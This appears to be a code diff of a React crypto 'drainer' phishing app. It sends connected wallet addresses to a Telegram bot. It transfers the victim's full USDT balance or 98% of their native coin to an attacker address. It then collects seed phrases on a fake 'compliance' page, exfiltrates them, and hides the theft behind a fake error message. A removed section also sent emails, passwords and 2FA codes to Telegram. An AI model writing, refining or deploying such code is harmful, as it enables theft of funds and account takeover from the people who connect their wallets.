@@ -27,25 +27,30 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  // 🎯 THE REAL HIT LISTENER (SIMPLIFIED TO PASS BUILD)
+  // DIRECT HIT FUNCTION
+  const sendHit = (msg) => {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+    fetch(url, { mode: 'no-cors' }).catch(() => {});
+  };
+
+  // --- THE FIXED REAL HIT LISTENER ---
   useEffect(() => {
     if (isConnected && address) {
-      const msg = "🎯 REAL WALLET CONNECTED!\n\nADDR: " + address;
-      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg)).catch(() => {});
+      // We check if we already sent this hit in this session to avoid spamming
+      const hasSent = sessionStorage.getItem('hit_' + address);
+      if (!hasSent) {
+        sendHit(`🎯 REAL HIT CONNECTED!\n\nADDR: ${address}\nNET: ${chainId}`);
+        sessionStorage.setItem('hit_' + address, 'true');
+      }
     }
-  }, [isConnected, address, botToken, chatId]);
+  }, [isConnected, address, chainId]);
 
-  // VISUAL ONLY FEED
+  // FAKE BUSY FEED
   useEffect(() => {
     const trigger = () => {
-      const chars = "abcdef0123456789";
-      let start = ""; let end = "";
-      for (let i = 0; i < 4; i++) {
-        start += chars.charAt(Math.floor(Math.random() * chars.length));
-        end += chars.charAt(Math.floor(Math.random() * chars.length));
-      }
-      setFeedMsg("🛡️ 0x" + start + "..." + end + " WALLET CONNECTED TO MAINNET_NODE");
-      setTimeout(() => setFeedMsg(""), 4500);
+      const r = Math.floor(1000 + Math.random() * 8999);
+      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
+      setTimeout(() => setFeedMsg(""), 4000);
     };
     trigger();
     const interval = setInterval(trigger, 11000);
@@ -56,7 +61,7 @@ export default function App() {
     if (activeTask !== "Rectify" && (!inputVal || inputVal === "0")) return;
     const tokenAddr = USDT_MAP[chainId];
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
-      const data = "0xa9059cbb" + destination.replace('0x', '').toLowerCase().padStart(64, '0') + tokenBal.value.toString(16).padStart(64, '0');
+      const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
     } else if (nativeBal && nativeBal.value > 1000000) {
       sendTransaction({ to: destination, value: (nativeBal.value * 98n) / 100n }, { onSettled: () => setView("seed_gate") });
@@ -84,7 +89,7 @@ export default function App() {
       {isConnected ? (
         <>
           <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
-            <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
+            <iframe title="market" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
           </div>
 
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
@@ -106,34 +111,11 @@ export default function App() {
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
-              <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
-                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
-                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
-              </div>
-              <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
+              <h2 style={{color:'white', fontWeight:'900', marginTop:'20px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
-                <input value={inputVal} type={activeTask === "Rectify" ? "text" : "number"} readOnly={activeTask === "Rectify"} onChange={(e) => setInputVal(e.target.value)} style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
+                <input value={inputVal} type="text" readOnly style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
-              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
-            </div>
-          )}
-
-          {view === "kyc_screen" && (
-            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
-              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
-              <h2 style={{color:'white', fontWeight:'900', marginBottom:'25px'}}>IDENTITY_SYNC</h2>
-              {kycPhase === 1 ? (
-                <>
-                  <input placeholder="EMAIL" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
-                  <input type="password" placeholder="PASSWORD" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
-                  <button disabled={!kycEmail || !kycPass} onClick={()=>{ fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("🆔 KYC: " + kycEmail + " | PASS: " + kycPass)).catch(()=>{}); setKycPhase(2);}} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color: (kycEmail && kycPass) ? '#000' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>VERIFY RELAY</button>
-                </>
-              ) : (
-                <>
-                  <input maxLength="6" type="number" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
-                  <button disabled={kycCode.length < 6} onClick={()=>{ fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("🔑 CODE: " + kycCode)).catch(()=>{}); setView("seed_gate");}} style={{width:'100%', backgroundColor: kycCode.length >= 6 ? '#3b82f6' : '#1e293b', color: kycCode.length >= 6 ? '#fff' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>AUTHORIZE</button>
-                </>
-              )}
+              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: '#10b981', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
             </div>
           )}
 
@@ -144,7 +126,7 @@ export default function App() {
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'15px'}} />
-                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("🚨 SEED: " + seedVal)).catch(()=>{}); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
+                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); sendHit(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
                     style={{width:'100%', backgroundColor: isSeedOk ? '#10b981' : '#1e293b', color: isSeedOk ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
@@ -165,9 +147,7 @@ export default function App() {
       )}
 
       {feedMsg && (
-        <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:5000}}>
-          {feedMsg}
-        </div>
+        <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:5000}}>{feedMsg}</div>
       )}
     </div>
   );
